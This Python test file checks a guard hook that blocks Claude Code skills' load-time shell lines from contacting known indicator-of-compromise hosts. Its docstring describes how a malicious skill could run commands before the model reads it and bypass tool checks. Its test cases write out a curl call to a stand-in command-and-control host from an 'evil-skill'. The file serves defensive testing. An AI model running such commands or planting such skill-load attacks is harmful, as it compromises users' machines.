#!/usr/bin/env python3
"""
Skill load-time shell lines are guarded (0.1.3).

WHY THIS EXISTS: Claude Code 2.1.332 added PreSkillShellCommand. A skill's or slash
command's load-time lines (!`cmd`, ```! blocks) run before the model reads the skill and
never pass through PreToolUse, so until 0.1.3 a skill could reach a live IOC at load with
no check. Drives main() with real hook JSON on stdin against a faked API row. No network.
"""
import importlib.util
import io
import json
import os
import sys
from contextlib import nullcontext, redirect_stderr
from unittest import mock

HERE = os.path.dirname(__file__)
GUARD = os.path.join(HERE, "..", "scripts", "nullcone-guard.py")
HOOKS = os.path.join(HERE, "..", "hooks", "hooks.json")
HOST = "c2.example"          # RFC 6761 reserved


def load_guard():
    spec = importlib.util.spec_from_file_location("guard", GUARD)
    g = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(g)
    return g


class FakeResp(io.BytesIO):
    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False


ROW = {"value": HOST, "ioc_type": "domain", "severity": 8, "confidence": 80,
       "family_name": "Malicious", "tags": ["feed"], "is_likely_fp": False,
       "confidence_tier": "community", "confidence_score": 0.61}


def run(payload, boom=False):
    g = load_guard()
    err = io.StringIO()
    code = 0
    patches = [mock.patch("sys.stdin", io.StringIO(json.dumps(payload))),
               mock.patch("urllib.request.urlopen", return_value=FakeResp(json.dumps(ROW).encode()))]
    if boom:
        patches.append(mock.patch.object(g, "_extract_indicators", side_effect=RuntimeError("x")))
    with patches[0], patches[1], redirect_stderr(err):
        ctx = patches[2] if boom else nullcontext()
        with ctx:
            try:
                g.main()
            except SystemExit as e:
                code = e.code
    return code, err.getvalue()


def skill(cmd, tool="Bash"):
    return {"hook_event_name": "PreSkillShellCommand", "tool_name": tool,
            "tool_input": {"command": cmd}, "command_name": "evil-skill",
            "command_source": "projectSettings"}


def pretool(cmd):
    return {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"command": cmd}}


# (payload, boom, want exit, want text in stderr, why)
CASES = [
    (skill(f"curl -s https://{HOST}/x"), False, 2, "skill load-time shell line (skill: evil-skill)",
     "a skill reaching a known IOC at load is blocked, and the block names the skill"),
    (skill(f"grep {HOST} notes.md"), False, 0, "NULLCONE NOTE",
     "a skill line that only mentions an IOC is a note, same as PreToolUse"),
    (skill("git status"), False, 0, "", "a clean skill line is silent"),
    ({**skill(f"curl -s https://{HOST}/x"), "tool_name": ""}, False, 2, "NULLCONE BLOCK",
     "a payload with no tool_name is treated as Bash, not skipped"),
    (skill(f"curl -s https://{HOST}/x"), True, 2, "guard error",
     "a guard error on a skill line fails CLOSED"),
    (pretool(f"curl -s https://{HOST}/x"), True, 0, "",
     "a guard error on interactive Bash still fails OPEN"),
    (pretool(f"curl -s https://{HOST}/x"), False, 2, "bash command",
     "PreToolUse blocking unchanged"),
]


def main():
    failures = []
    for payload, boom, want_code, want_text, why in CASES:
        code, err = run(payload, boom)
        if code != want_code or (want_text and want_text not in err) or (not want_text and err):
            failures.append(f"  {why}\n    want exit {want_code} + {want_text!r}, got exit {code}: {err.strip()[:160]!r}")

    hooks = json.load(open(HOOKS))["hooks"].get("PreSkillShellCommand", [])
    if not any(h.get("matcher") == "Bash" and "nullcone-guard.py" in h["hooks"][0]["command"] for h in hooks):
        failures.append("  hooks.json does not register the guard on PreSkillShellCommand/Bash")

    total = len(CASES) + 1
    if failures:
        print(f"FAIL {len(failures)}/{total}\n" + "\n".join(failures))
        return 1
    print(f"PASS {total}/{total} skill-shell cases")
    return 0


if __name__ == "__main__":
    sys.exit(main())
